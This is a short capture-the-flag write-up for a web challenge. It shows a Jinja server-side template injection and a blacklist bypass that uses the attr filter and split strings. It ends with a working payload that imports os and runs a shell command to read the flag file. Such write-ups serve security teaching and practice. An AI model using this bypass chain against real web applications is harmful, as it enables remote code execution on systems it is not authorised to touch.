## [CSIT] Grimoire  

<img src="images/chall.png" width=600>

We are given a simple webpage where we are allowed to compile spell formulas.  

<img src="images/webpage.png" width=800>

If we enter a payload like `{{7*7}}` as the spell formula, we immediately notice an SSTI vuln.  

<img src="images/ssti.png" width=800>

However, if we try a more complex chain like `{{self.__init__.__globals__}}`, the compilation fails.  

The error message suggests that our input is being checked against a blacklist.  

<img src="images/blocked.png" width=800>

We can try obfuscating our payload by dynamically accessing attributes using the `| attr()` filter, which will succeed in bypassing the filter.  

<img src="images/globals.png" width=800>

From there, we can get RCE and find the flag in the parent directory.  

```python
self.__init__ | attr('__glob''als__') | attr('__getitem__')('__buil''tins__') | attr('__getitem__')('__im''port__')('os') | attr('popen')('cat  ../flag.txt') | attr('read')()
```

<img src="images/flag.png" width=800>

Flag: `Cyberthon{ssti_jinja_fun}`